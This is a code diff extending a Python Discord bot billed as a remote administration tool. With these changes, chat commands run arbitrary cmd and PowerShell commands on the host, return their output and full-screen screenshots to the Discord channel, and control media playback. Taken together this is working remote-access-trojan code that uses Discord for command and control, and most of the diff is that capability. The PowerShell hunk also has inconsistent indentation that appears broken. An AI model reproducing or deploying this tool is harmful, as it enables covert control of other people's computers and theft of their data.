@@ -14,18 +14,28 @@ import time
 # Dependency of screenshot
 from mss import mss
 
+# Dependency of media
+from input_commands import InputCommands
+
 # For using commands in different systems
 from helpers import get_operating
 
 # Platform name 
 operating_sys = get_operating()
 
+
 # Here you can modify the bot's prefix and description and whether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
-# Enter Discord Bot Token & Channel ID:
-BOT_TOKEN = 'Enter Token here'
-CHANNEL_ID = 'Enter Channel ID here'
+import local_credentials as LocalCredentials
+
+#Create a local_credentials (added to .gitignore) file with the very same variables so there is no risk to commit credentials by mistake
+BOT_TOKEN = LocalCredentials.BOT_TOKEN
+CHANNEL_ID = LocalCredentials.CHANNEL_ID
+
+
+# Used by !echo(set) and !cmd / !powershell(get)
+display_output = True
 
 
 @client.event
@@ -53,7 +63,9 @@ async def on_ready():
 @client.command()
 async def cmd(cmnd):
 	await client.say("Executing in command prompt: " + cmnd)
-	os.system(cmnd)
+	cmnd_result = os.popen(cmnd).read()
+	if display_output == True:
+		await client.say(cmnd_result)
 	await asyncio.sleep(3)
 
 
@@ -63,10 +75,11 @@ async def cmd(cmnd):
 # Dependencies: time, os
 @client.command()
 async def powershell(cmnd):
-
 	if operating_sys == "Windows":
 		await client.say("Executing in powershell: " + cmnd)
-		os.system("powershell {}".format(cmnd))
+	  cmnd_result = os.popen("powershell {}".format(cmnd)).read()
+	  if display_output == True:
+		  await client.say(cmnd_result)
 	else:
 		await client.say("Powershell is only available in Windows")
 	await asyncio.sleep(3)
@@ -184,8 +197,8 @@ async def logoff(seconds = 0):
 # Description: Takes a screenshot and sends it back
 # Usage: !screenshot or !screenshot secondsToScreenshot
 # Dependencies: time, os, mss
-@client.command()
-async def screenshot(seconds = 0):
+@client.command(pass_context = True)
+async def screenshot(ctx, seconds = 0):
 	if os.path.isfile('screenshot.png'):  # Check if a screenshot.png exists, if yes, delete it so it can be replaced
 		os.remove('screenshot.png')
 	await client.say("Taking a screenshot.")
@@ -193,10 +206,7 @@ async def screenshot(seconds = 0):
 		time.sleep(seconds)
 	with mss() as sct:
 		filename = sct.shot(mon=-1, output='screenshot.png')
-	try:
-		await client.send_file(client.get_channel(CHANNEL_ID),'screenshot.png')
-	except:
-		await client.say("An error occurred.")
+	await client.send_file(ctx.message.channel, 'screenshot.png')
 
 
 # Module: say
@@ -211,5 +221,49 @@ async def say(txt):
 	else:
 		await client.say("Can't use TTS")
 	await asyncio.sleep(3)
+
+
+# Module: media
+# Description: Controls Media Features
+# Usage: !media command times
+# Dependencies: ctypes, time
+@client.command()
+async def media(*args):
+	command = args[0]
+	times = int(args[1]) if len(args)>1 else 1
+	switcher = {
+		'vol-up':InputCommands.up_volume,
+		'vol-down':InputCommands.down_volume,
+		'vol-mute':InputCommands.mute_volume,
+		'next':InputCommands.media_next,
+		'prev':InputCommands.media_previous,
+		'stop':InputCommands.media_stop,
+		'play':InputCommands.media_play_pause,
+		'pause':InputCommands.media_play_pause
+		}
+	
+	for time in range(0,times):
+		switcher[command]()
+		await asyncio.sleep(0.5)
+	
+	await client.say('Media Adjusted!')
+
+	
+# Module: echo
+# Description: Turns command output display to discord chat on and off (works for !cmd and !powershell)
+# Usage: !echo off or !echo on
+# Dependencies: None
+@client.command()
+async def echo(status):
+	global display_output
+	if status == "on":
+		display_output = True
+		await client.say("!cmd and !powershell output will be displayed in chat. ")
+	elif status == "off":
+		display_output = False
+		await client.say("!cmd and !powershell output will be hidden from chat. ")
+	else:
+		await client.say("Parameter of echo can be off or on. ")
+
 
 client.run(BOT_TOKEN)
